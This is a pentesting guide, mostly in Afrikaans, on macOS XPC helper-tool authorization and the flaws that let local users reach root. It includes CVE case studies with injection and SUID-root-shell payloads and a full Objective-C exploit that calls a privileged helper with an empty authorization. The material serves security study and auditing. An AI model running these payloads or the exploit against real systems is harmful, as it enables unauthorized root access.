# macOS XPC-magtiging

{{#include ../../../../../banners/hacktricks-training.md}}

## XPC-magtiging

Apple stel ook 'n ander manier voor om te verifieer indien die verbindende proses **toestemmings het om 'n blootgestelde XPC-metode aan te roep**.

Wanneer 'n toepassing moet **aksies uitvoer as 'n gebruiker met voorregte**, installeer dit gewoonlik as root 'n HelperTool as 'n XPC-diens wat vanaf die toepassing aangeroep kan word om daardie aksies uit te voer, in plaas daarvan om die app as 'n voorregte-gebruiker te laat loop. Die toepassing wat die diens aanroep, moet egter genoegsame magtiging hê.

### ShouldAcceptNewConnection altyd YES

'n Voorbeeld is te vinde in [EvenBetterAuthorizationSample](https://github.com/brenwell/EvenBetterAuthorizationSample). In `App/AppDelegate.m` probeer dit om te **verbind** met die **HelperTool**. En in `HelperTool/HelperTool.m` sal die funksie **`shouldAcceptNewConnection`** **nie enige van die voorheen genoemde vereistes nagaan nie.** Dit sal altyd YES teruggee:
```objectivec
- (BOOL)listener:(NSXPCListener *)listener shouldAcceptNewConnection:(NSXPCConnection *)newConnection
// Called by our XPC listener when a new connection comes in.  We configure the connection
// with our protocol and ourselves as the main object.
{
assert(listener == self.listener);
#pragma unused(listener)
assert(newConnection != nil);

newConnection.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperToolProtocol)];
newConnection.exportedObject = self;
[newConnection resume];

return YES;
}
```
Vir meer inligting oor hoe om hierdie kontrole behoorlik te konfigureer:

{{#ref}}
macos-xpc-connecting-process-check/
{{#endref}}

### Toepassingsregte

Daar is egter 'n mate van **authorisasie wat plaasvind wanneer 'n metode van die HelperTool aangeroep word**.

Die funksie **`applicationDidFinishLaunching`** uit `App/AppDelegate.m` sal 'n leë authorisasie-referensie skep nadat die app begin het. Dit behoort altyd te werk.\
Then, it will try to **add some rights** to that authorization reference calling `setupAuthorizationRights`:
```objectivec
- (void)applicationDidFinishLaunching:(NSNotification *)note
{
[...]
err = AuthorizationCreate(NULL, NULL, 0, &self->_authRef);
if (err == errAuthorizationSuccess) {
err = AuthorizationMakeExternalForm(self->_authRef, &extForm);
}
if (err == errAuthorizationSuccess) {
self.authorization = [[NSData alloc] initWithBytes:&extForm length:sizeof(extForm)];
}
assert(err == errAuthorizationSuccess);

// If we successfully connected to Authorization Services, add definitions for our default
// rights (unless they're already in the database).

if (self->_authRef) {
[Common setupAuthorizationRights:self->_authRef];
}

[self.window makeKeyAndOrderFront:self];
}
```
Die funksie `setupAuthorizationRights` uit `Common/Common.m` sal in die auth database `/var/db/auth.db` die regte van die toepassing stoor. Let hoe dit slegs die regte sal byvoeg wat nog nie in die database is nie:
```objectivec
+ (void)setupAuthorizationRights:(AuthorizationRef)authRef
// See comment in header.
{
assert(authRef != NULL);
[Common enumerateRightsUsingBlock:^(NSString * authRightName, id authRightDefault, NSString * authRightDesc) {
OSStatus    blockErr;

// First get the right.  If we get back errAuthorizationDenied that means there's
// no current definition, so we add our default one.

blockErr = AuthorizationRightGet([authRightName UTF8String], NULL);
if (blockErr == errAuthorizationDenied) {
blockErr = AuthorizationRightSet(
authRef,                                    // authRef
[authRightName UTF8String],                 // rightName
(__bridge CFTypeRef) authRightDefault,      // rightDefinition
(__bridge CFStringRef) authRightDesc,       // descriptionKey
NULL,                                       // bundle (NULL implies main bundle)
CFSTR("Common")                             // localeTableName
);
assert(blockErr == errAuthorizationSuccess);
} else {
// A right already exists (err == noErr) or any other error occurs, we
// assume that it has been set up in advance by the system administrator or
// this is the second time we've run.  Either way, there's nothing more for
// us to do.
}
}];
}
```
Die funksie `enumerateRightsUsingBlock` is die een wat gebruik word om toepassings se toestemming te kry, wat gedefinieer is in `commandInfo`:
```objectivec
static NSString * kCommandKeyAuthRightName    = @"authRightName";
static NSString * kCommandKeyAuthRightDefault = @"authRightDefault";
static NSString * kCommandKeyAuthRightDesc    = @"authRightDescription";

+ (NSDictionary *)commandInfo
{
static dispatch_once_t sOnceToken;
static NSDictionary *  sCommandInfo;

dispatch_once(&sOnceToken, ^{
sCommandInfo = @{
NSStringFromSelector(@selector(readLicenseKeyAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.readLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to read its license key.",
@"prompt shown when user is required to authorize to read the license key"
)
},
NSStringFromSelector(@selector(writeLicenseKey:authorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.writeLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleAuthenticateAsAdmin,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to write its license key.",
@"prompt shown when user is required to authorize to write the license key"
)
},
NSStringFromSelector(@selector(bindToLowNumberPortAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.startWebService",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to start its web service.",
@"prompt shown when user is required to authorize to start the web service"
)
}
};
});
return sCommandInfo;
}

+ (NSString *)authorizationRightForCommand:(SEL)command
// See comment in header.
{
return [self commandInfo][NSStringFromSelector(command)][kCommandKeyAuthRightName];
}

+ (void)enumerateRightsUsingBlock:(void (^)(NSString * authRightName, id authRightDefault, NSString * authRightDesc))block
// Calls the supplied block with information about each known authorization right..
{
[self.commandInfo enumerateKeysAndObjectsUsingBlock:^(id key, id obj, BOOL *stop) {
#pragma unused(key)
#pragma unused(stop)
NSDictionary *  commandDict;
NSString *      authRightName;
id              authRightDefault;
NSString *      authRightDesc;

// If any of the following asserts fire it's likely that you've got a bug
// in sCommandInfo.

commandDict = (NSDictionary *) obj;
assert([commandDict isKindOfClass:[NSDictionary class]]);

authRightName = [commandDict objectForKey:kCommandKeyAuthRightName];
assert([authRightName isKindOfClass:[NSString class]]);

authRightDefault = [commandDict objectForKey:kCommandKeyAuthRightDefault];
assert(authRightDefault != nil);

authRightDesc = [commandDict objectForKey:kCommandKeyAuthRightDesc];
assert([authRightDesc isKindOfClass:[NSString class]]);

block(authRightName, authRightDefault, authRightDesc);
}];
}
```
Dit beteken dat aan die einde van hierdie proses die permissies wat binne `commandInfo` verklaar is, gestoor sal word in `/var/db/auth.db`. Let daarop dat jy daar vir **elke metode** wat **vereis authentisering** sal hê, die **toestemmingsnaam** en die **`kCommandKeyAuthRightDefault`** kan vind. Laasgenoemde **dui aan wie hierdie reg kan kry**.

There are different scopes to indicate who can access a right. Some of them are defined in [AuthorizationDB.h](https://github.com/aosm/Security/blob/master/Security/libsecurity_authorization/lib/AuthorizationDB.h) (you can find [all of them in here](https://www.dssw.co.uk/reference/authorization-rights/)), but as summary:

<table><thead><tr><th width="284.3333333333333">Naam</th><th width="165">Waarde</th><th>Beskrywing</th></tr></thead><tbody><tr><td>kAuthorizationRuleClassAllow</td><td>allow</td><td>Enigiemand</td></tr><tr><td>kAuthorizationRuleClassDeny</td><td>deny</td><td>Niemand</td></tr><tr><td>kAuthorizationRuleIsAdmin</td><td>is-admin</td><td>Huidige gebruiker moet 'n admin wees (binne die admin-groep)</td></tr><tr><td>kAuthorizationRuleAuthenticateAsSessionUser</td><td>authenticate-session-owner</td><td>Vra gebruiker om te autentiseer.</td></tr><tr><td>kAuthorizationRuleAuthenticateAsAdmin</td><td>authenticate-admin</td><td>Vra gebruiker om te autentiseer. Die gebruiker moet 'n admin wees (binne die admin-groep)</td></tr><tr><td>kAuthorizationRightRule</td><td>rule</td><td>Spesifiseer reëls</td></tr><tr><td>kAuthorizationComment</td><td>comment</td><td>Spesifiseer bykomende kommentaar oor die reg</td></tr></tbody></table>

### Rights Verification

In `HelperTool/HelperTool.m` die funksie **`readLicenseKeyAuthorization`** kontroleer of die oproeper gemagtig is om **so 'n metode uit te voer** deur die funksie **`checkAuthorization`** aan te roep. Hierdie funksie sal nagaan of die **authData** wat deur die oproepende proses gestuur is 'n **korrekte formaat** het en dan sal dit kyk **wat benodig word om die reg te kry** om die spesifieke metode aan te roep. Indien alles goed gaan sal die **teruggegewe `error` `nil` wees**:
```objectivec
- (NSError *)checkAuthorization:(NSData *)authData command:(SEL)command
{
[...]

// First check that authData looks reasonable.

error = nil;
if ( (authData == nil) || ([authData length] != sizeof(AuthorizationExternalForm)) ) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:paramErr userInfo:nil];
}

// Create an authorization ref from that the external form data contained within.

if (error == nil) {
err = AuthorizationCreateFromExternalForm([authData bytes], &authRef);

// Authorize the right associated with the command.

if (err == errAuthorizationSuccess) {
AuthorizationItem   oneRight = { NULL, 0, NULL, 0 };
AuthorizationRights rights   = { 1, &oneRight };

oneRight.name = [[Common authorizationRightForCommand:command] UTF8String];
assert(oneRight.name != NULL);

err = AuthorizationCopyRights(
authRef,
&rights,
NULL,
kAuthorizationFlagExtendRights | kAuthorizationFlagInteractionAllowed,
NULL
);
}
if (err != errAuthorizationSuccess) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:err userInfo:nil];
}
}

if (authRef != NULL) {
junk = AuthorizationFree(authRef, 0);
assert(junk == errAuthorizationSuccess);
}

return error;
}
```
Noteer dat om die **vereistes te kontroleer om die reg te kry** om daardie metode aan te roep, sal die funksie `authorizationRightForCommand` net die vroeër genoemde objek **`commandInfo`** nagaan. Daarna sal dit **`AuthorizationCopyRights`** aanroep om te kontroleer **of dit die regte het** om die funksie aan te roep (let daarop dat die vlagte interaksie met die gebruiker toelaat).

In hierdie geval, om die funksie `readLicenseKeyAuthorization` aan te roep, is die `kCommandKeyAuthRightDefault` gedefinieer as `@kAuthorizationRuleClassAllow`. Dus kan **enigiemand dit aanroep**.

### DB Inligting

Daar is genoem dat hierdie inligting in `/var/db/auth.db` gestoor word. Jy kan alle gestoorde reëls lys met:
```sql
sudo sqlite3 /var/db/auth.db
SELECT name FROM rules;
SELECT name FROM rules WHERE name LIKE '%safari%';
```
Dan kan jy lees wie toegang tot die reg het met:
```bash
security authorizationdb read com.apple.safaridriver.allow
```
### Permissiewe regte

Jy kan **alle toestemmingskonfigurasies** [**hierso**](https://www.dssw.co.uk/reference/authorization-rights/) vind, maar die kombinasies wat geen gebruikersinteraksie sal vereis nie sou wees:

1. **'authenticate-user': 'false'**
- Dit is die mees direkte sleutel. As dit op `false` gestel is, dui dit aan dat 'n gebruiker nie verifikasie hoef te verskaf om hierdie reg te kry nie.
- Dit word gebruik in **kombinasie met een van die 2 hieronder of deur aan te dui tot watter groep die gebruiker moet behoort**.
2. **'allow-root': 'true'**
- As 'n gebruiker as die root user optree (wat verhoogde toestemmings het), en hierdie sleutel op `true` gestel is, kan die root user moontlik hierdie reg kry sonder verdere verifikasie. Tipies vereis om na 'n root user-status te kom reeds verifikasie, so dit is nie vir die meeste gebruikers 'n "geen verifikasie" scenario nie.
3. **'session-owner': 'true'**
- As dit op `true` gestel is, kry die eienaar van die sessie (die tans aangemelde gebruiker) outomaties hierdie reg. Dit kan addisionele verifikasie omseil as die gebruiker reeds aangemeld is.
4. **'shared': 'true'**
- Hierdie sleutel verleen nie regte sonder verifikasie nie. In plaas daarvan, as dit op `true` gestel is, beteken dit dat sodra die reg geverifieer is, dit tussen verskeie prosesse gedeel kan word sonder dat elkeen weer hoef te verifieer. Maar die aanvanklike toekenning van die reg sal steeds verifikasie vereis tensy dit met ander sleutels gekombineer word soos `'authenticate-user': 'false'`.

Jy kan [**gebruik hierdie script**](https://gist.github.com/carlospolop/96ecb9e385a4667b9e40b24e878652f9) om die interessante regte te kry:
```bash
Rights with 'authenticate-user': 'false':
is-admin (admin), is-admin-nonshared (admin), is-appstore (_appstore), is-developer (_developer), is-lpadmin (_lpadmin), is-root (run as root), is-session-owner (session owner), is-webdeveloper (_webdeveloper), system-identity-write-self (session owner), system-install-iap-software (run as root), system-install-software-iap (run as root)

Rights with 'allow-root': 'true':
com-apple-aosnotification-findmymac-remove, com-apple-diskmanagement-reservekek, com-apple-openscripting-additions-send, com-apple-reportpanic-fixright, com-apple-servicemanagement-blesshelper, com-apple-xtype-fontmover-install, com-apple-xtype-fontmover-remove, com-apple-dt-instruments-process-analysis, com-apple-dt-instruments-process-kill, com-apple-pcastagentconfigd-wildcard, com-apple-trust-settings-admin, com-apple-wifivelocity, com-apple-wireless-diagnostics, is-root, system-install-iap-software, system-install-software, system-install-software-iap, system-preferences, system-preferences-accounts, system-preferences-datetime, system-preferences-energysaver, system-preferences-network, system-preferences-printing, system-preferences-security, system-preferences-sharing, system-preferences-softwareupdate, system-preferences-startupdisk, system-preferences-timemachine, system-print-operator, system-privilege-admin, system-services-networkextension-filtering, system-services-networkextension-vpn, system-services-systemconfiguration-network, system-sharepoints-wildcard

Rights with 'session-owner': 'true':
authenticate-session-owner, authenticate-session-owner-or-admin, authenticate-session-user, com-apple-safari-allow-apple-events-to-run-javascript, com-apple-safari-allow-javascript-in-smart-search-field, com-apple-safari-allow-unsigned-app-extensions, com-apple-safari-install-ephemeral-extensions, com-apple-safari-show-credit-card-numbers, com-apple-safari-show-passwords, com-apple-icloud-passwordreset, com-apple-icloud-passwordreset, is-session-owner, system-identity-write-self, use-login-window-ui
```
### Authorization Bypass Case Studies

- **CVE-2025-65842 – Acustica Audio Aquarius HelperTool**: Die bevoorregte Mach-diens `com.acustica.HelperTool` aanvaar elke verbinding en sy `checkAuthorization:`-roetine roep `AuthorizationCopyRights(NULL, …)` aan, sodat enige 32‑byte blob deurgaan. `executeCommand:authorization:withReply:` voed dan deur die aanvaller beheerste komma‑geskeide stringe in `NSTask` as root, wat payloads soos:
```bash
"/bin/sh,-c,cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash"
```
skep op eenvoudige wyse 'n SUID root shell. Details in [this write-up](https://almightysec.com/helpertool-xpc-service-local-privilege-escalation/).
- **CVE-2025-55076 – Plugin Alliance InstallationHelper**: Die listener returns altyd YES en dieselfde NULL `AuthorizationCopyRights`-patroon verskyn in `checkAuthorization:`. Metode `exchangeAppWithReply:` konkateer aanvaller-invoer in 'n `system()`-string twee keer, so die inspuiting van shell-metatekens in `appPath` (bv. `"/Applications/Test.app";chmod 4755 /tmp/rootbash;`) lewer root-kode-uitvoering via die Mach service `com.plugin-alliance.pa-installationhelper`. More info [here](https://almightysec.com/Plugin-Alliance-HelperTool-XPC-Service-Local-Privilege-Escalation/).
- **CVE-2024-4395 – Jamf Compliance Editor helper**: Die uitvoering van 'n audit drop `/Library/LaunchDaemons/com.jamf.complianceeditor.helper.plist`, maak die Mach service `com.jamf.complianceeditor.helper` beskikbaar, en exporteer `-executeScriptAt:arguments:then:` sonder om die caller se `AuthorizationExternalForm` of code signature te verifieer. 'n Triviale exploit `AuthorizationCreate`s 'n leë verwysing, verbind met `[[NSXPCConnection alloc] initWithMachServiceName:options:NSXPCConnectionPrivileged]`, en roep die metode aan om arbitrêre binaries as root uit te voer. Full reversing notes (plus PoC) in [Mykola Grymalyuk’s write-up](https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html).
- **CVE-2025-25251 – FortiClient Mac helper**: FortiClient Mac 7.0.0–7.0.14, 7.2.0–7.2.8 en 7.4.0–7.4.2 het crafted XPC-boodskappe aanvaar wat 'n geprivilegieerde helper bereik het wat geen authorization gates gehad het nie. Omdat die helper sy eie geprivilegieerde `AuthorizationRef` vertrou het, kon enige plaaslike gebruiker wat die diens kon bemesber, dit dwing om arbitrêre konfigurasiewysigings of opdragte as root uit te voer. Details in [SentinelOne’s advisory summary](https://www.sentinelone.com/vulnerability-database/cve-2025-25251/).

#### Rapid triage tips

- Wanneer 'n app beide 'n GUI en 'n helper lewer, diff hul code requirements en kontroleer of `shouldAcceptNewConnection` die listener met `-setCodeSigningRequirement:` sluit (of `SecCodeCopySigningInformation` verifieer). Ontbrekende kontroles lei gewoonlik tot CWE-863-scenario's soos die Jamf-geval. 'n Vinnige blik lyk soos:
```bash
codesign --display --requirements - /Applications/Jamf\ Compliance\ Editor.app
```
- Vergelyk wat die helper *dink* hy magtig met wat die kliënt verskaf. Wanneer jy reverse-engineer, breek by `AuthorizationCopyRights` en bevestig dat die `AuthorizationRef` afkomstig is van `AuthorizationCreateFromExternalForm` (deur die kliënt verskaf) in plaas van die helper se eie bevoorregte konteks, anders het jy waarskynlik 'n CWE-863-patroon gevind soortgelyk aan die gevalle hierbo.

## Reversing Authorization

### Checking if EvenBetterAuthorization is used

If you find the function: **`[HelperTool checkAuthorization:command:]`** it's probably the the process is using the previously mentioned schema for authorization:

<figure><img src="../../../../../images/image (42).png" alt=""><figcaption></figcaption></figure>

Indien hierdie funksie funksies soos `AuthorizationCreateFromExternalForm`, `authorizationRightForCommand`, `AuthorizationCopyRights`, `AuhtorizationFree` aanroep, gebruik dit [**EvenBetterAuthorizationSample**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L101-L154).

Kyk die **`/var/db/auth.db`** om te sien of dit moontlik is om toestemming te kry om sommige bevoorregte aksies sonder gebruikersinteraksie aan te roep.

### Protocol Communication

Dan moet jy die protokolskema vind om 'n kommunikasie met die XPC-diens te kan vestig.

The function **`shouldAcceptNewConnection`** indicates the protocol being exported:

<figure><img src="../../../../../images/image (44).png" alt=""><figcaption></figcaption></figure>

In hierdie geval is dit dieselfde as in EvenBetterAuthorizationSample, [**kyk hierdie lyn**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L94).

As jy die naam van die gebruikte protokol ken, is dit moontlik om sy header-definisie te dump met:
```bash
class-dump /Library/PrivilegedHelperTools/com.example.HelperTool

[...]
@protocol HelperToolProtocol
- (void)overrideProxySystemWithAuthorization:(NSData *)arg1 setting:(NSDictionary *)arg2 reply:(void (^)(NSError *))arg3;
- (void)revertProxySystemWithAuthorization:(NSData *)arg1 restore:(BOOL)arg2 reply:(void (^)(NSError *))arg3;
- (void)legacySetProxySystemPreferencesWithAuthorization:(NSData *)arg1 enabled:(BOOL)arg2 host:(NSString *)arg3 port:(NSString *)arg4 reply:(void (^)(NSError *, BOOL))arg5;
- (void)getVersionWithReply:(void (^)(NSString *))arg1;
- (void)connectWithEndpointReply:(void (^)(NSXPCListenerEndpoint *))arg1;
@end
[...]
```
Laastens moet ons net die **naam van die blootgestelde Mach Service** weet om 'n kommunikasie daarmee te vestig. Daar is verskeie maniere om dit te vind:

- In die **`[HelperTool init]`** waar jy kan sien dat die Mach Service gebruik word:

<figure><img src="../../../../../images/image (41).png" alt=""><figcaption></figcaption></figure>

- In die launchd plist:
```xml
cat /Library/LaunchDaemons/com.example.HelperTool.plist

[...]

<key>MachServices</key>
<dict>
<key>com.example.HelperTool</key>
<true/>
</dict>
[...]
```
### Exploit Voorbeeld

In hierdie voorbeeld word geskep:

- Die definisie van die protokol met die funksies
- 'n leë auth om te gebruik om toegang te vra
- 'n verbinding met die XPC service
- 'n oproep na die funksie indien die verbinding suksesvol was
```objectivec
// gcc -framework Foundation -framework Security expl.m -o expl

#import <Foundation/Foundation.h>
#import <Security/Security.h>

// Define a unique service name for the XPC helper
static NSString* XPCServiceName = @"com.example.XPCHelper";

// Define the protocol for the helper tool
@protocol XPCHelperProtocol
- (void)applyProxyConfigWithAuthorization:(NSData *)authData settings:(NSDictionary *)settings reply:(void (^)(NSError *))callback;
- (void)resetProxyConfigWithAuthorization:(NSData *)authData restoreDefault:(BOOL)shouldRestore reply:(void (^)(NSError *))callback;
- (void)legacyConfigureProxyWithAuthorization:(NSData *)authData enabled:(BOOL)isEnabled host:(NSString *)hostAddress port:(NSString *)portNumber reply:(void (^)(NSError *, BOOL))callback;
- (void)fetchVersionWithReply:(void (^)(NSString *))callback;
- (void)establishConnectionWithReply:(void (^)(NSXPCListenerEndpoint *))callback;
@end

int main(void) {
NSData *authData;
OSStatus status;
AuthorizationExternalForm authForm;
AuthorizationRef authReference = {0};
NSString *proxyAddress = @"127.0.0.1";
NSString *proxyPort = @"4444";
Boolean isProxyEnabled = true;

// Create an empty authorization reference
status = AuthorizationCreate(NULL, kAuthorizationEmptyEnvironment, kAuthorizationFlagDefaults, &authReference);
const char* errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);

// Convert the authorization reference to an external form
if (status == errAuthorizationSuccess) {
status = AuthorizationMakeExternalForm(authReference, &authForm);
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Convert the external form to NSData for transmission
if (status == errAuthorizationSuccess) {
authData = [[NSData alloc] initWithBytes:&authForm length:sizeof(authForm)];
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Ensure the authorization was successful
assert(status == errAuthorizationSuccess);

// Establish an XPC connection
NSString *serviceName = XPCServiceName;
NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:serviceName options:0x1000];
NSXPCInterface *xpcInterface = [NSXPCInterface interfaceWithProtocol:@protocol(XPCHelperProtocol)];
[xpcConnection setRemoteObjectInterface:xpcInterface];
[xpcConnection resume];

// Handle errors for the XPC connection
id remoteProxy = [xpcConnection remoteObjectProxyWithErrorHandler:^(NSError *error) {
NSLog(@"[-] Connection error");
NSLog(@"[-] Error: %@", error);
}];

// Log the remote proxy and connection objects
NSLog(@"Remote Proxy: %@", remoteProxy);
NSLog(@"XPC Connection: %@", xpcConnection);

// Use the legacy method to configure the proxy
[remoteProxy legacyConfigureProxyWithAuthorization:authData enabled:isProxyEnabled host:proxyAddress port:proxyPort reply:^(NSError *error, BOOL success) {
NSLog(@"Response: %@", error);
}];

// Allow some time for the operation to complete
[NSThread sleepForTimeInterval:10.0f];

NSLog(@"Finished!");
}
```
## Ander XPC privilege-helpers wat misbruik word

- [https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared](https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared)

## Verwysings

- [https://theevilbit.github.io/posts/secure_coding_xpc_part1/](https://theevilbit.github.io/posts/secure_coding_xpc_part1/)
- [https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html](https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html)
- [https://www.sentinelone.com/vulnerability-database/cve-2025-25251/](https://www.sentinelone.com/vulnerability-database/cve-2025-25251/)
- [https://almightysec.com/helpertool-xpc-service-local-privilege-escalation/](https://almightysec.com/helpertool-xpc-service-local-privilege-escalation/)
- [https://almightysec.com/Plugin-Alliance-HelperTool-XPC-Service-Local-Privilege-Escalation/](https://almightysec.com/Plugin-Alliance-HelperTool-XPC-Service-Local-Privilege-Escalation/)

{{#include ../../../../../banners/hacktricks-training.md}}
